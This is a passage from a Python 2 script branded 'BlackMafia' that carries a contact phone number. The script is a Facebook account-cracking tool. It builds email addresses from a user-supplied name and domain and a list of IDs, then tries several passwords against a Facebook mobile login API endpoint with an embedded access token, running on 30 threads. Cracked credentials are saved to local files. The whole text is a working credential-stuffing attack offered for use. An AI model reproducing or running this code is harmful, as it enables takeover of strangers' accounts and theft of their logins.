\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xb7\xe2\xa3\xa6\xe2\xa3\xa4\xe2\xa3\xb4\xe2\xa3\xbe\xe2\xa3\xbf\xe2\xa3\xb6\xe2\xa3\xa4\xe2\xa3\xa4\xe2\xa3\xb4\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n                 BlackMafia\n         WhatsApp          03094161457\n\x1b[1;95m\xc2\xab-----------------\x1b[1;91mBlackMafia\x1b[1;95m-----------------\xc2\xbb'
domain = "Domain : \n@gmail.com @yahoo.com @hotmail.com"
namet = "Example Name : Alex"
def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []

def blackmafiax():
    os.system('clear')
    print logo
    print '\x1b[1;93m-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-\x1b[1;97m> \x1b[1;91m\xe2\x98\x86.\x1b[1;93m\xee\x82\xa0[1]  Start Hacking'
    time.sleep(0.05)
    print '\x1b[1;93m-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-\x1b[1;97m> \x1b[1;91m\xe2\x98\x86.\x1b[1;91m\xee\x82\xa0[0]  Back            '
    time.sleep(0.05)
    print 45 * '-'
    action()


def action():
    global cpb
    global oks
    lovehackerx = raw_input('\n\x1b[1;91mChoose an Option>>> \x1b[1;95m')
    if lovehackerx == '':
        print '[!] Fill in correctly'
        action()
    elif lovehackerx == '1':
        os.system('clear')
        print namet
        try:
            k = raw_input('\x1b[1;95m Type Any Name  : ')
            print domain
            c = raw_input('\x1b[1;95m Type Any Domin : ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            blackmafiax()

    elif lovehackerx == '0':
        login()
    else:
        print '[!] Fill in correctly'
        action()
        
    blackmafiax = raw_input('\x1b[1;93m Type Any Password No1: ')
    blackmafiaxx = raw_input('\x1b[1;92m Type Any Password No2: ')
    blackmafiaxxx = raw_input('\x1b[1;96m Type Any Password No3: ')
    xxx = str(len(id))
    jalan('[\xe2\x9c\x93] Total Numbers: ' + xxx)
    time.sleep(0.05)
    jalan(' \x1b[1;93mPlz Wait Cloned Accounts Will Appear Here')
    time.sleep(0.05)
    jalan('[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.05)
    print 44 * '-'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = blackmafiax
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK\xe2\x88\x9a]  ' + k + user + c + '  ===  ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass1 + '\n')
                okb.close()
                oks.append(k + user + c + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m[OK\xe2\x88\x9a] ' + k + user + c + '  ===  ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass1 + '\n')
                cps.close()
                cpb.append(k + user + c + pass1)
            else:
                pass2 = blackmafiaxx
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[OK\xe2\x88\x9a]  ' + k + user + c + '  ===  ' + pass2 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass2 + '\n')
                    okb.close()
                    oks.append(k + user + c + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;92m[OK\xe2\x88\x9a] ' + k + user + c + '  ===  ' + pass2 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass2 + '\n')
                    cps.close()
                    cpb.append(k + user + c + pass2)
                else:
                    pass3 = blackmafiaxxx
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[OK\xe2\x88\x9a]  ' + k + user + c + '  ===  ' + pass3 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass3 + '\n')
                        okb.close()
                        oks.append(k + user + c + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;92m[OK\xe2\x88\x9a] ' + k + user + c + '  ===  ' + pass3 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass3 + '\n')
                        cps.close()
                        cpb.append(k + user + c + pass3)
                    else:
                        pass4 = k
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[OK\xe2\x88\x9a]  ' + k + user + c + '  ===  ' + pass4 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass4 + '\n')
                            okb.close()
                            oks.append(k + user + c + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;92m[OK\xe2\x88\x9a] ' + k + user + c + '  ===  ' + pass4 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass4 + '\n')
                            cps.close()
                            cpb.append(k + user + c + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 44 * '-'
    print '[\xe2\x9c\x93] Process Has Been Completed ....'
    print '[\xe2\x9c\x93] Total OK\xe2\x88\x9a Email : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
    print '\x1b[1;96m\n        \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\xbf\xe2\xa0\x9b\xe2\xa0\x89\xe2\xa0\x89\xe2\xa0\x89\xe2\xa0\x89\xe2\xa0\x89\xe2\xa0\x89\xe2\xa0\x89\xe2\xa0\x9b\xe2\xa2\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n        \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa0\x8f\xe2\xa0\x84\xe2\xa2\x80\xe2\xa3\xa0\xe2\xa3\xb6\xe2\xa3\xb6\xe2\xa3\xb6\xe2\xa3\xb6\xe2\xa3\xa4\xe2\xa1\x80\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\xb9\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n        \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\x8f\xe2\xa0\x84\xe2\xa0\x84\xe2\xa3\xbe\xe2\xa1\xbf\xe2\xa2\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\xbf\xe2\xa2\xbf\xe2\xa3\xbf\xe2\xa1\x86\xe2\xa0\x84\xe2\xa0\x84\xe2\xa2\xbb\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n        \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\xbf\xe2\xa0\x83\xe2\xa0\x84\xe2\xa0\x84\xe2\xa2\xbf\xe2\xa3\x87\xe2\xa3\xb8\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\x87\xe2\xa3\xb8\xe2\xa1\xbf\xe2\xa0\x83\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\xb8\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n        \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\xbf\xe2\xa0\x8b\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x89\xe2\xa0\x9b\xe2\xa0\x9b\xe2\xa0\x9b\xe2\xa0\x9b\xe2\xa0\x89\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x99\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n        \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\x9f\xe2\xa0\x81\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x88\xe2\xa2\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n        \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\x9f\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\xa0\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x88\xe2\xa2\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n        \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\x9f\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa2\xa0\xe2\xa3\x86\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa3\xa7\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x88\xe2\xa2\xbf\xe2\xa3\xbf\n        \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\x87\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa3\xbe\xe2\xa3\xbf\xe2\xa1\x80\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa2\xb0\xe2\xa3\xbf\xe2\xa3\xa7\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x98\xe2\xa3\xbf\n        \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\x87\xe2\xa0\x84\xe2\xa3\xb0\xe2\xa3\xb6\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xa6\xe2\xa3\x80\xe2\xa1\x80\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa2\x80\xe2\xa3\xa0\xe2\xa3\xb4\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xb6\xe2\xa3\x86\xe2\xa0\x84\xe2\xa2\x80\xe2\xa3\xbf\n        \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa0\x8f\xe2\xa0\x84\xe2\xa0\x84\xe2\xa2\xb8\xe2\xa3\xbf\xe2\xa0\x87\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\xb9\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n        \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xb7\xe2\xa3\xa6\xe2\xa3\xa4\xe2\xa3\xb4\xe2\xa3\xbe\xe2\xa3\xbf\xe2\xa3\xb6\xe2\xa3\xa4\xe2\xa3\xa4\xe2\xa3\xb4\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n                  BlackMafia\n           WhatsApp.       03094161457'
    raw_input('\n\x1b[1;95m[\x1b[1;91mBack\x1b[1;95m]')
    blackmafiax()


if __name__ == '__main__':
    blackmafiax()
